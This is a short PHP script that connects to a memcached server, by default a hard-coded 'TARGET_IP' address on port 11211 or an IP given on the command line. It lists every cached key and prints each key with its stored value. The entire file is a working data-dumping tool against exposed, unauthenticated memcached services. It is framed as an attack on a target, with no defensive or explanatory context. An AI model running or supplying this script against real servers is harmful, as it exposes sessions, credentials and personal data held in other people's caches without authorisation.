<?php
	$TARGET_IP   = 1 < count($argv) ? $argv[1] : "192.161.185.89";
	$TARGET_PORT = 11211;

	$pool = new Memcached();
	if (!($pool->addServer($TARGET_IP, $TARGET_PORT))) {
		printf("Failed to add target: %s:%d\n", $TARGET_IP, $TARGET_PORT);
	} else if (!($dumped = $pool->getAllKeys())) {
		printf("Failed to getAllKeys()\n");
	} else {
		//var_dump($dumped);
		foreach ($dumped as $key => $value) {
			printf("%s,%s,%s,%s\n", $TARGET_IP, $key, $value, $pool->get($value));
		}
	}
	$pool->quit();
	$pool = NULL;
?>
